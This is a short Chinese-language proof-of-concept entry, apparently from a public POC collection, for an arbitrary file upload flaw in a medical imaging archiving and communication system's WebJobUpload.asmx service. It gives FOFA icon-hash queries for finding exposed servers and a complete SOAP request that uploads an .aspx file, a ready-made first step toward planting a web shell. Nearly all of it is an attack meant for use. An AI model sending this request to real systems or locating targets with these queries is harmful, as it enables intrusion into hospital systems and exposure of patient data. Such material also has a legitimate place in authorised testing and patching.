## 英飞达医学影像存档与通信系统WebJobUpload任意文件上传漏洞

## fofa
```
icon_hash="1474455751" || icon_hash="702238928"
```

![26c19e0fd94f9ed212609cbb142a5efc](https://github.com/wy876/POC/assets/139549762/06bbb356-9749-45e7-80bf-868a611936cb)

## poc
```
POST /webservices/WebJobUpload.asmx HTTP/1.1
Host: 0.0.0.0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Content-Length: 410
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=utf-8
Soapaction: "http://rainier/jobUpload"
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<jobUpload xmlns="http://rainier">
<vcode>1</vcode>
<subFolder></subFolder>
<fileName>test.aspx</fileName>
<bufValue>dGVzdA==</bufValue>
</jobUpload>
</soap:Body>
</soap:Envelope>
```


![ee4dcedec011b388f84d3086e9b84fbd](https://github.com/wy876/POC/assets/139549762/1396d267-c32e-4452-af68-a2a4a9ba45ad)
